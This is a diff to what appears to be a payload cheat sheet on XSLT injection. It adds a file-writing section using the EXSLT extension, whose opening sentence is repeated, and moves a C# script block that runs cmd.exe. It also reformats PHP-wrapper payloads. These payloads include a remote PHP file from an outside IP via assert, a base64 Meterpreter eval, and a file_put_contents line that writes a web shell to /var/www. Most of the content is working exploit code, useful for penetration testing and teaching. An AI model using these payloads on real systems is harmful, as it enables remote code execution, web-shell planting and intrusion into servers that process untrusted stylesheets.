@@ -11,7 +11,7 @@
     - [Determine the vendor and version](#determine-the-vendor-and-version)
     - [External Entity](#external-entity)
     - [Read files and SSRF using document](#read-files-and-ssrf-using-document)
-    - [Remote Code Execution with Embedded Script Blocks](#remote-code-execution-with-embedded-script-blocks)
+    - [Write files with EXSLT extension](#write-files-with-exslt-extension)
     - [Remote Code Execution with PHP wrapper](#remote-code-execution-with-php-wrapper)
     - [Remote Code Execution with Java](#remote-code-execution-with-java)
     - [Remote Code Execution with Native .NET](#remote-code-execution-with-native-net)
@@ -57,7 +57,6 @@
       - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
     </xsl:for-each>
   </xsl:template>
-
 </xsl:stylesheet>
 ```
 
@@ -80,36 +79,26 @@
 </xsl:stylesheet>
 ```
 
-### Remote Code Execution with Embedded Script Blocks
+
+### Write files with EXSLT extension
+
+EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. 
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-xmlns:msxsl="urn:schemas-microsoft-com:xslt"
-xmlns:user="urn:my-scripts">
-
-<msxsl:script language = "C#" implements-prefix = "user">
-<![CDATA[
-public string execute(){
-System.Diagnostics.Process proc = new System.Diagnostics.Process();
-proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
-proc.StartInfo.RedirectStandardOutput = true;
-proc.StartInfo.UseShellExecute = false;
-proc.StartInfo.Arguments = "/c dir";
-proc.Start();
-proc.WaitForExit();
-return proc.StandardOutput.ReadToEnd();
-}
-]]>
-</msxsl:script>
-
-  <xsl:template match="/fruits">
-  --- BEGIN COMMAND OUTPUT ---
-	<xsl:value-of select="user:execute()"/>
-  --- END COMMAND OUTPUT ---	
+<xsl:stylesheet
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exploit="http://exslt.org/common" 
+  extension-element-prefixes="exploit"
+  version="1.0">
+  <xsl:template match="/">
+    <exploit:document href="evil.txt" method="text">
+      Hello World!
+    </exploit:document>
   </xsl:template>
 </xsl:stylesheet>
 ```
+
 
 ### Remote Code Execution with PHP wrapper
 
@@ -128,9 +117,9 @@ Execute the function `scandir`.
 
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
-        <xsl:template match="/">
-                <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
-        </xsl:template>
+  <xsl:template match="/">
+    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
+  </xsl:template>
 </xsl:stylesheet>
 ```
 
@@ -140,10 +129,10 @@ Execute a remote php file using `assert`
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
-		<xsl:variable name="payload">
-			include("http://10.10.10.10/test.php")
-		</xsl:variable>
-		<xsl:variable name="include" select="php:function('assert',$payload)"/>
+  <xsl:variable name="payload">
+    include("http://10.10.10.10/test.php")
+  </xsl:variable>
+  <xsl:variable name="include" select="php:function('assert',$payload)"/>
 </body>
 </html>
 ```
@@ -152,12 +141,12 @@ Execute a PHP meterpreter using PHP wrapper.
 
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
-        <xsl:template match="/">
-                <xsl:variable name="eval">
-                        eval(base64_decode('Base64-encoded Meterpreter code'))
-                </xsl:variable>
-                <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
-        </xsl:template>
+  <xsl:template match="/">
+    <xsl:variable name="eval">
+      eval(base64_decode('Base64-encoded Meterpreter code'))
+    </xsl:variable>
+    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
+  </xsl:template>
 </xsl:stylesheet>
 ```
 
@@ -165,9 +154,9 @@ Execute a remote php file using `file_put_contents`
 
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
-        <xsl:template match="/">
-                <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
-        </xsl:template>
+  <xsl:template match="/">
+    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
+  </xsl:template>
 </xsl:stylesheet>
 ```
 
@@ -217,11 +206,43 @@ Execute a remote php file using `file_put_contents`
         </xsl:for-each>
       </TABLE>
     </xsl:template>
-  </xsl:stylesheet>
+</xsl:stylesheet>
 ```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="urn:my-scripts">
+
+<msxsl:script language = "C#" implements-prefix = "user">
+<![CDATA[
+public string execute(){
+System.Diagnostics.Process proc = new System.Diagnostics.Process();
+proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
+proc.StartInfo.RedirectStandardOutput = true;
+proc.StartInfo.UseShellExecute = false;
+proc.StartInfo.Arguments = "/c dir";
+proc.Start();
+proc.WaitForExit();
+return proc.StandardOutput.ReadToEnd();
+}
+]]>
+</msxsl:script>
+
+  <xsl:template match="/fruits">
+  --- BEGIN COMMAND OUTPUT ---
+	<xsl:value-of select="user:execute()"/>
+  --- END COMMAND OUTPUT ---	
+  </xsl:template>
+</xsl:stylesheet>
+```
+
 
 ## References
 
-* [From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
+* [From XSLT code execution to Meterpreter shells - @agarri - 02 July 2012](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
 * [XSLT Injection - Fortify](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
 * [XSLT Injection Basics - Saxon](https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
+* [Getting XXE in Web Browsers using ChatGPT - Igor Sak-Sakovskiy - May 22, 2024](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
+* [XSLT injection lead to file creation - PT SWARM - 30 may 2024](https://twitter.com/ptswarm/status/1796162911108255974/photo/1)
